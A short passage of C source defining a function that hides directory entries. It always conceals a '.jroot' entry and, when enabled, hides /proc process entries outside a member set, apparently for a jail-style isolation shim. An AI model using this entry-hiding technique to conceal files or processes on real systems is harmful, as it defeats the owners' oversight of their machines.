#endif

static int jp_hide_entry(DIR *dirp, const char *name) {
    if (strcmp(name, ".jroot") == 0) return 1;
    if (!jp_enabled()) return 0;
    if (!jp_all_digits(name)) return 0;
    if (!jp_dir_is_proc((void *)dirp)) return 0;
    return !jp_member((pid_t)jnum(name));
}

